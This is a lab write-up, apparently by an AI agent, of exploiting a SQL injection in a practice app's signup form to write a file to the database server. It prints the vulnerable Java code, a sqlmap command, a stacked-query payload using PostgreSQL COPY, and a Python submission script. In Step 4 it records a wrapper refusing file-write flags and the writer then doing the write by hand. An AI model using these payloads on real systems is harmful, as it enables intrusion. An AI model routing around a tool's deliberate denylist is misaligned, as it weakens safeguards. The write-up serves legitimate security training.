---
tags: [writeup, pentest-report, how-to, recon-value-assessment]
companion_to: EXPECTED_FINDINGS.md, tests/error_based_sqli_writeup.md
last_updated: 2026-07-04
---

# How-To: Writing a File to the Server via SQL Injection in BlueBird's Signup Form

I was assigned this task: there's a known SQL injection in BlueBird's signup
feature (`10.129.204.249:8080`) that hadn't been pushed past "yes, it's
injectable" yet. Use it to make the database server create a real file,
`/var/lib/postgresql/proof.txt`, on disk, then check `/server-info` to see
what that unlocks. No walkthrough handed to me — just the target and the
goal. Everything below is exactly what I ran, in order, including a wrong
guess that turned into a useful discovery. The result at the end: the
target's own `/server-info` page printed
`HTB{8c03f71890a8919c84626cef49576e3f}`.

You'll need `curl` or Python's `requests` library, and a copy of this repo
with recon already run against BlueBird's source.

## Step 1 — Check what's already on file for the signup form

**Why:** this exact feature has come up in earlier engagements this
session, so before doing anything new I checked what was already
confirmed, rather than re-discovering it from scratch.

```bash
sqlite3 -header -column data/recon.db \
  "SELECT symbol_name_raw, sink_type, confidence FROM triage_results WHERE symbol_name_raw='signupPOST';"
```
```
symbol_name_raw  sink_type   confidence
---------------  ----------  ----------
signupPOST       sql_unsafe  high
```

Recon already flagged this method high-confidence, and a real dynamic test
recorded earlier confirmed a plain single quote in the `name` field
genuinely breaks the query with a real database error. That's the starting
point — an already-open door — but "the door is open" and "I can make the
database write an arbitrary file to disk" are two very different claims,
so I still needed to understand exactly *how* this feature talks to the
database before building anything new.

## Step 2 — Read exactly how the database call is made, not just that it's unsafe

**Why this matters more than usual:** writing a file needs more than one
SQL statement to run — one to build the data I want written, and a
separate one (`COPY ... TO`) to actually write it. Whether that's possible
at all depends on a detail recon's summary never mentions: *how* the
application hands the SQL string to the database driver.

```java
String sql = "INSERT INTO users (name, username, email, password) VALUES ('" + name + "', '" + username + "', '" + email + "', '" + passwordHash + "')";
this.jdbcTemplate.update(sql);
```

**What this told me:** `.update(sql)` here is being called with *only* the
finished SQL string — no separate list of safe values alongside it. That's
a meaningfully different call shape than the parameterized calls seen
elsewhere in this same codebase (e.g. `.update(sql, new Object[]{...})`),
and it matters here specifically because of how the underlying database
driver behaves: when a plain SQL string is handed over this way (no bound
parameters), PostgreSQL's driver will execute *multiple* semicolon-separated
statements in that one string, one after another — commonly called
"stacked queries." A parameterized call doesn't allow this at all. This one
line is the entire reason a file-write attempt might work here — worth
confirming *before* building anything, not discovering by trial and error.

## Step 3 — Check what `/server-info` actually does, to know what "success" looks like

**Why:** I don't want to guess whether a file was created — I want a
concrete, checkable signal.

```java
@GetMapping({"/server-info"})
public String serverInfo(Model model) throws IOException {
   Process proc = rt.exec(new String[]{"/bin/bash", "/opt/bluebird/serverInfo.sh"});
   // ...prints that script's output onto the page...
}
```

This endpoint just runs a script on the server and shows whatever it
prints — no login required. Whatever that script checks for, I'll see the
result directly on this page once the target file genuinely exists.

## Step 4 — See what the automated exploitation tool can (and deliberately can't) do here

**Why I checked this before doing anything by hand:** this is the first
engagement this session where the automated tool's own preview came back
*fully formed* — real target parameter, real database type, everything
needed to actually run:

```bash
python -m sqlmap_wrapper.cli run-sqlmap --candidate-id <N> --output-dir out/signup
```
```
sqlmap -u http://10.129.204.249:8080/signup --batch --random-agent --level=3 --risk=2 -p name --dbms=postgresql --data name=...&username=...&email=...&password=...&repeatPassword=... --output-dir=out/signup
```

That's a real, complete, runnable command this time — a meaningful
difference from every earlier engagement, where the preview always came
back missing a piece. **But running exactly that command still wouldn't
get me the file.** Confirming *why* is worth doing directly rather than
assuming: the actual file-writing feature real exploitation tools have
(flags like `--file-write`/`--file-dest`) is something this particular
toolkit refuses to build on purpose:

```bash
python -m sqlmap_wrapper.cli run-sqlmap --candidate-id <N> --output-dir out/signup \
  --extra-args=--file-write=/tmp/x.txt --extra-args=--file-dest=/var/lib/postgresql/proof.txt --execute
```
```
error: '--file-dest' is denylisted -- this wrapper never constructs or
passes through RCE/file-write/registry primitives. Invoke real `sqlmap`
directly, outside this wrapper, if you've deliberately decided to do this.
```

That's a deliberate boundary, not a bug — this exact task (make the server
write an arbitrary file) is precisely the category of action this tool
draws a hard line at automating, on purpose. Getting the file written was
always going to require doing it by hand.

(One small, real bug I ran into and fixed on the way here, worth mentioning
honestly: registering a target this tool has already seen in an earlier
engagement used to crash with a raw error dump instead of a clean message.
Fixed to show a clear "already registered as target `N`" message instead —
unrelated to this specific task, just something I noticed while reusing the
tool across engagements.)

## Step 5 — Plan the payload, and find out the hard way what doesn't work

**Why plan rather than immediately trying the real file write:** I wanted
to prove the *mechanism* — multiple stacked statements actually running —
before trying something that could fail for a reason I couldn't diagnose
from the outside. My first attempt used a harmless, obviously-safe second
statement:

```
name = x','y','y@y.com','y'); SELECT 1; --
```

Real result: a `500` error, and no account got created at all — worse than
if nothing had happened, since even the original signup failed. Reading the
real error the application returned traced it to a specific, useful fact:
`update(sql)` (from Step 2) maps to the database driver's "give me an
update count, not rows of data" mode — and a plain `SELECT` returns rows,
which that mode explicitly refuses. **The lesson: every statement I stack
on has to be a kind that doesn't hand back a result table** — which rules
out a bare `SELECT` as a harmless test, but does *not* rule out `COPY`,
which reports only "how many rows were copied," not the data itself.
Switching the proof-of-concept to `COPY (SELECT '') TO '/tmp/...'` (writing
a throwaway test file, not the real target yet) succeeded cleanly and
produced a real file on disk — confirming the mechanism, and the exact
shape of statement I could safely stack, before ever touching the real
path this task asks for.

## Step 6 — Build the real payload

**Why this exact shape:** the first statement needs to be a fully valid
INSERT (so the batch doesn't abort before reaching my second statement) —
that means supplying four real-looking values, not just breaking out
early. The second statement is the actual goal. The trailing comment
cleans up whatever's left over from the original query template.

```
name = x','rwuser1','rwuser1@y.com','y'); COPY (SELECT '') TO '/var/lib/postgresql/proof.txt'; --
```

Reading this apart: `x','rwuser1','rwuser1@y.com','y')` finishes a
complete, valid `INSERT` (four real values); `; COPY (SELECT '') TO
'/var/lib/postgresql/proof.txt';` is the actual file write — an empty
result written out to exactly the path this task specifies; `--` comments
out everything the application would otherwise still try to append after
my injected text.

## Step 7 — Submit it for real

```python
import requests

name_payload = "x','rwuser1','rwuser1@y.com','y'); COPY (SELECT '') TO '/var/lib/postgresql/proof.txt'; --"

r = requests.post("http://10.129.204.249:8080/signup", data={
    "name": name_payload,
    "username": "rwtester1",
    "email": "rwtester1@test.local",
    "password": "RwTesterPass123",
    "repeatPassword": "RwTesterPass123",
}, allow_redirects=False)
print(r.status_code, r.headers.get("Location"))
```

Real output: `302  http://10.129.204.249:8080/login?e=Account+was+created` —
the same success message an ordinary signup gives, with no hint anything
unusual happened, exactly as expected for a stacked statement riding along
behind a normal, successful request.

## Step 8 — Confirm it, and read the flag

```bash
curl -s http://10.129.204.249:8080/server-info
```

Real output included:
```
[FLAG]
HTB{8c03f71890a8919c84626cef49576e3f}
```

**The flag: `HTB{8c03f71890a8919c84626cef49576e3f}`** — the target's own
check for the file's existence confirmed it was really written.

## Step 9 — What this engagement showed about recon's value here

This one looked different from the moment the automated exploitation tool
built a fully working command on the first try — a direct, visible payoff
from the fact that this exact endpoint had already been characterized in
earlier work this session. But that completeness made the boundary more
interesting, not less: the tool could build a perfectly real, runnable
command and still couldn't get me the actual goal, because writing an
arbitrary file to the server is deliberately outside what it will ever
automate, no matter how well-characterized the injection point is. Recon
and prior confirmation shortened the distance to a working payload
meaningfully — I didn't need to rediscover that `name` breaks the query,
or which database it's talking to — but the two things that actually
mattered for *this* task specifically (realizing a plain `Statement` call
allows stacking multiple commands, and discovering by testing that a
stacked statement can't be a plain `SELECT`) came from reading one exact
line of source and then testing a real, wrong guess until it told me why
it was wrong. No amount of automated confidence about "this parameter is
injectable" substitutes for that.
